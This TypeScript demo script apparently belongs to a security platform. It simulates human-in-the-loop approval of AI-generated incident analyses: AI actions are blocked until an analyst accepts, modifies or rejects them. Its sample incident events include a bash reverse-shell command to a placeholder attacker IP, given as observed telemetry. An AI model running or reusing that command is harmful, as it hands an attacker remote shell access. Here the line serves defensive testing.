/**
 * Human Oversight & AI Decision-Rights Simulation (§16 & §16.1)
 * 
 * Demonstrates:
 * 1. AI Recommendation generation wrapped in 10-field mandatory AiReviewEnvelope.
 * 2. Downstream execution gating (blocking action execution without human decision).
 * 3. Human analyst oversight (Accept / Modify / Reject / Escalate with mandatory rationale).
 * 4. Post-approval authorized action execution and evidence lineage.
 */

import 'dotenv/config';
import 'reflect-metadata';
import * as crypto from 'crypto';
import { DecisionRightsService } from '../apps/shield-ai/src/decision-rights/decision-rights.service';
import { IncidentRcaGeneratorService } from '../apps/shield-ai/src/rca/incident-rca-generator.service';

async function main() {
  console.log('========================================================================');
  console.log(' 🛡️  ZoikoShield Human Oversight & AI Decision-Rights Engine Simulation');
  console.log('    Specification: ZS-ENG-AI-001 §16 & Figure 11 (Decision-Rights Model)');
  console.log('========================================================================\n');

  const decisionRightsService = new DecisionRightsService();
  const rcaGenerator = new IncidentRcaGeneratorService(decisionRightsService);

  const tenantId = `tenant-${crypto.randomUUID().slice(0, 8)}`;
  const incidentId = `inc-critical-${Date.now()}`;

  console.log('[Step 1] Synthesizing Governed Incident Root Cause Analysis...');
  const { report, envelope } = rcaGenerator.generateGovernedIncidentRca({
    incidentId,
    tenantId,
    title: 'Adversary Lateral Movement & Privilege Escalation Attempt',
    severity: 'CRITICAL',
    events: [
      {
        eventId: 'evt-aws-01',
        timestamp: new Date(Date.now() - 600000).toISOString(),
        source: 'aws.cloudtrail',
        eventType: 'MFA_BYPASS_LOGIN',
        actor: 'compromised-admin@enterprise.com',
        targetResource: 'iam-role/production-admin',
        details: { ip: '198.51.100.44', region: 'us-east-1' },
      },
      {
        eventId: 'evt-k8s-02',
        timestamp: new Date(Date.now() - 300000).toISOString(),
        source: 'ebpf-kernel-probe',
        eventType: 'SUSPICIOUS_EXECVE',
        actor: 'compromised-admin@enterprise.com',
        targetResource: 'pod/vault-secrets-worker',
        details: { cmd: '/bin/bash -i >& /dev/tcp/198.51.100.44/4444 0>&1' },
      },
    ],
    attackGraphPath: ['host-bastion-ingress', 'pod-vault-worker', 'db-pci-vault'],
  });

  if (!envelope) {
    throw new Error('Expected envelope to be generated');
  }

  console.log(`  ✔ Synthesized RCA [${report.rcaId}]`);
  console.log(`  ✔ Wrapped in AiReviewEnvelope [${envelope.envelopeId}]`);
  console.log(`    - AI Label & Use-Case: ${envelope.aiLabelAndUseCaseName.aiLabel} (${envelope.aiLabelAndUseCaseName.useCaseName})`);
  console.log(`    - Calibrated Confidence: ${envelope.calibratedConfidenceAndUncertainty.score * 100}% (${envelope.calibratedConfidenceAndUncertainty.qualitativeBand})`);
  console.log(`    - Supporting Spans: ${envelope.sourcesAndSpans.length} source span(s) verified`);
  console.log(`    - Required Authority: ${envelope.requiredAuthorityAndApprovals.requiredRole} (Tier: ${envelope.requiredAuthorityAndApprovals.responseAuthorityTier})`);
  console.log(`    - Current State: ${envelope.controls.state}`);

  console.log('\n[Step 2] Testing Downstream Action Gatekeeping (Blocking unverified actions)...');
  try {
    decisionRightsService.assertActionPermitted(tenantId, envelope.envelopeId, {
      role: 'INCIDENT_COMMANDER',
      responseAuthorityTier: 'R3',
    });
    console.error('  ❌ FAIL: Unreviewed action was erroneously permitted!');
  } catch (err) {
    console.log(`  ✔ PASS: Action execution blocked before human review [${(err as Error).name}: ${(err as Error).message}]`);
  }

  console.log('\n[Step 3] Human Oversight: Lead Analyst Modifying Containment Plan...');
  const humanDecision = await decisionRightsService.recordHumanDecision(
    tenantId,
    envelope.envelopeId,
    {
      decision: 'MODIFY',
      decidedBy: 'lead-incident-commander@enterprise.com',
      rationale: 'Approved with modification: Isolate pod and revoke token, but delay database lock until memory dump completes.',
      modifiedContent: 'Isolate pod/vault-secrets-worker and revoke compromised-admin token immediately; hold DB lock for forensic capture.',
    },
  );

  console.log(`  ✔ Decision Recorded: ${humanDecision.humanDecisionAndRationale.decision}`);
  console.log(`  ✔ Approver: ${humanDecision.humanDecisionAndRationale.decidedBy}`);
  console.log(`  ✔ Rationale: "${humanDecision.humanDecisionAndRationale.rationale}"`);
  console.log(`  ✔ Modified Content: "${humanDecision.humanDecisionAndRationale.modifiedContent}"`);
  console.log(`  ✔ Evidence Ref: ${humanDecision.humanDecisionAndRationale.evidenceRef}`);
  console.log(`  ✔ Envelope State: ${humanDecision.controls.state}`);

  console.log('\n[Step 4] Re-Evaluating Downstream Action Authorization Post-Approval...');
  const authorizedEnvelope = decisionRightsService.assertActionPermitted(
    tenantId,
    envelope.envelopeId,
    {
      role: 'INCIDENT_COMMANDER',
      responseAuthorityTier: 'R3',
    },
  );

  console.log(`  ✔ PASS: Downstream action authorized for execution under Human Oversight!`);
  console.log(`  ✔ Target Scope: ${authorizedEnvelope.expectedImpactAndReversibility.blastRadius}`);
  console.log(`  ✔ Compensation Plan: ${authorizedEnvelope.expectedImpactAndReversibility.compensationPlan}`);
  console.log(`  ✔ Customer Appeal Route: ${authorizedEnvelope.appealOrFeedbackRoute.appealUrl}`);

  console.log('\n========================================================================');
  console.log(' 🎉 Human Oversight & Decision-Rights Engine (§16) Simulation PASSED!');
  console.log('========================================================================\n');
}

main().catch((err) => {
  console.error('❌ Simulation failed:', err);
  process.exit(1);
});
